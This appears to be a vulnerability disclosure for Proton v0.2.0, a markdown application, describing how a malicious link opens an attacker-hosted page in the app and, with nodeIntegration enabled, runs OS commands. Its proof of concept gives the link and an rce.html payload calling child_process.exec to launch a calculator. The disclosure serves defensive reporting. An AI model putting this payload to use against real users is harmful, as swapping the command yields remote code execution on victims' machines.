## Description

Proton **v0.2.0** allows an attacker to create a malicious
link inside a markdown file. When the victim clicks the link,
the application opens the site in the current frame allowing
an attacker to host JavaScript code in the malicious link in
order to trigger an XSS attack. The `nodeIntegration` configuration
is set to **on** which allows the webpage to use `NodeJs` features,
an attacker can leverage this to run OS commands.

## Proof of Concept

### Steps to reproduce

1. Create a markdown file with the following content.

   ```javascript
   [Click me!!!](http://192.168.1.67:8002/rce.html)
   ```

2. Host the `rce.html` file with the following
   content on a server controlled by the attacker.

   ```javascript
    <script>
        require('child_process').exec('calc');
    </script>
   ```

3. Send the markdown file to the victim.
   When the victim clicks the markdown link the site
   will be open inside electron and the JavaScript
   code will spawn a calculator.

### System Information

* Version: Proton v0.2.0.
* Operating System: Windows 10.0.19042 N/A Build 19042.
